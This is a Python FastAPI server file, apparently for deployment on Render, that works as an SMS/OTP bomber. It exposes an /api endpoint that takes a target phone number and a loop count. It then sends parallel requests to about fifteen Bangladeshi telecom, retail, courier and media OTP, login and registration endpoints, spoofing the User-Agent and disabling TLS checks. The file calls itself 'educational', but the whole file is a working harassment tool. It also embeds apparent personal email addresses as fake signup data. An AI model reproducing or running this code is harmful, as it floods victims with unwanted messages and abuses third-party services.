# language: Python, file: main.py, target: Render
import asyncio
from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import httpx

app = FastAPI(title="RASHIK API Server")

# CORS এনাবল করা হলো যেন যেকোনো ব্রাউজার থেকে সরাসরি লিংক হিট করা যায়
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
)

API_OWNER = {
    "name": "Hasib Hossen (Async Python Engine by RASHIK)",
    "purpose": "Educational API Testing"
}

def get_apis(phone_str: str):
    last10 = phone_str[-10:]
    return [
        {
            'name': 'Coke Studio OTP',
            'url': 'https://cokestudio23.sslwireless.com/api/store-and-send-otp',
            'method': 'POST',
            'json': {
                'msisdn': '880' + last10,
                'name': 'Aulad Hosen',
                'email': 'uladhosenridoy@gmail.com',
                'dob': '2000-01-01',
                'occupation': 'N/A',
                'gender': 'male'
            }
        },
        {
            'name': 'Grameenphone OTP',
            'url': 'https://weblogin.grameenphone.com/backend/api/v1/otp',
            'method': 'POST',
            'json': {'msisdn': '0' + last10}
        },
        {
            'name': 'Rabbit Hole OTP',
            'url': 'https://apix.rabbitholebd.com/appv2/login/requestOTP',
            'method': 'POST',
            'json': {'mobile': '+880' + last10}
        },
        {
            'name': 'Oshudpotro OTP',
            'url': 'https://api.osudpotro.com/api/v1/users/send_otp',
            'method': 'POST',
            'json': {
                'mobile': '+88-0' + last10,
                'deviceToken': 'web',
                'language': 'en',
                'os': 'web'
            }
        },
        {
            'name': 'Fundesh OTP',
            'url': 'https://fundesh.com.bd/api/auth/generateOTP',
            'method': 'POST',
            'json': {'msisdn': last10},
            'params': {'service_key': ''}
        },
        {
            'name': 'Swap OTP',
            'url': 'https://api.swap.com.bd/api/v1/send-otp',
            'method': 'POST',
            'json': {'phone': '0' + last10}
        },
        {
            'name': 'Airtel Login OTP',
            'url': 'https://api.bd.airtel.com/v1/account/login/otp',
            'method': 'POST',
            'json': {'phone_number': '0' + last10}
        },
        {
            'name': 'Bikroy Login',
            'url': 'https://bikroy.com/data/phone_number_login/verifications/phone_login',
            'method': 'GET',
            'params': {'phone': '0' + last10}
        },
        {
            'name': 'Rokomari OTP',
            'url': 'https://www.rokomari.com/otp/send',
            'method': 'GET',
            'params': {'emailOrPhone': '880' + last10, 'countryCode': 'BD'}
        },
        {
            'name': 'eCourier OTP',
            'url': 'https://backoffice.ecourier.com.bd/api/web/individual-send-otp',
            'method': 'GET',
            'params': {'mobile': '0' + last10}
        },
        {
            'name': 'Prothom Alo OTP',
            'url': 'https://prod-api.viewlift.com/identity/signup',
            'method': 'POST',
            'json': {
                'requestType': 'send',
                'phoneNumber': '+880' + last10,
                'emailConsent': True,
                'whatsappConsent': False
            },
            'params': {'site': 'prothomalo'}
        },
        {
            'name': 'Hoichoi OTP',
            'url': 'https://prod-api.viewlift.com/identity/signup',
            'method': 'POST',
            'json': {
                'requestType': 'send',
                'phoneNumber': '+880' + last10,
                'emailConsent': True,
                'whatsappConsent': True
            },
            'params': {'site': 'hoichoitv'}
        },
        {
            'name': 'Paperfly Registration',
            'url': 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
            'method': 'POST',
            'json': {
                'full_name': 'Hjbdnd',
                'company_name': 'Hello',
                'email_address': 'uladhosen860@gmail.com',
                'phone_number': '0' + last10
            }
        },
        {
            'name': 'Eon Bazar Registration',
            'url': 'https://app.eonbazar.com/api/auth/register',
            'method': 'POST',
            'json': {
                'mobile': '0' + last10,
                'name': 'Hello',
                'password': 'helloq',
                'email': 'ajajsjfhcj@gmail.com'
            }
        },
        {
            'name': 'Sundarban Courier OTP',
            'url': 'https://tracking.sundarbancourierltd.com/PreBooking/SendPin',
            'method': 'POST',
            'json': {'PreBookingRegistrationPhoneNumber': '0' + last10}
        }
    ]

async def send_request(client: httpx.AsyncClient, api: dict):
    """প্রতিটি API তে ব্যাকগ্রাউন্ড রিকোয়েস্ট পাঠাবে"""
    try:
        url = api['url']
        method = api['method']
        params = api.get('params')
        json_data = api.get('json')
        
        if method == 'POST':
            res = await client.post(url, params=params, json=json_data, timeout=10.0)
        else:
            res = await client.get(url, params=params, timeout=10.0)
            
        return {
            'name': api['name'],
            'status': res.status_code,
            'success': 200 <= res.status_code < 300
        }
    except Exception as e:
        return {
            'name': api['name'],
            'status': 500,
            'success': False,
            'error': str(e)
        }

@app.get("/")
async def home():
    return {"message": "API is Live. Hit /api?phone=NUMBER&amount=1"}

@app.get("/api")
async def attack_api(
    phone: str = Query(..., description="Target Phone Number (10 or 11 digits)"), 
    amount: int = Query(1, description="Number of loops to execute")
):
    # নাম্বার ভ্যালিডেশন
    if not phone.isdigit() or not (10 <= len(phone) <= 11):
        return JSONResponse(status_code=400, content={
            "owner": API_OWNER,
            "error": "Invalid phone number format. Use 10-11 digits."
        })
        
    last10 = phone[-10:]
    apis = get_apis(phone)
    results = []
    success_count = 0
    
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    
    # প্যারালাল (একসাথে) সব API তে রিকোয়েস্ট হিট করার লজিক
    async with httpx.AsyncClient(verify=False, headers=headers) as client:
        for _ in range(amount):
            tasks = [send_request(client, api) for api in apis]
            batch_results = await asyncio.gather(*tasks) # একসাথে সব সেন্ড হবে (Ultra Fast)
            
            results.extend(batch_results)
            success_count += sum(1 for r in batch_results if r['success'])
            
            if amount > 1:
                await asyncio.sleep(1) # লুপের মাঝে ১ সেকেন্ড গ্যাপ
                
    return {
        'owner': API_OWNER,
        'request_info': {
            'formatted_phone': '0' + last10,
            'target_amount': amount,
            'total_requests_sent': len(results),
            'successful': success_count,
            'failed': len(results) - success_count,
        },
        'status': 'Process completed successfully.',
        'detailed_results': results
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000)
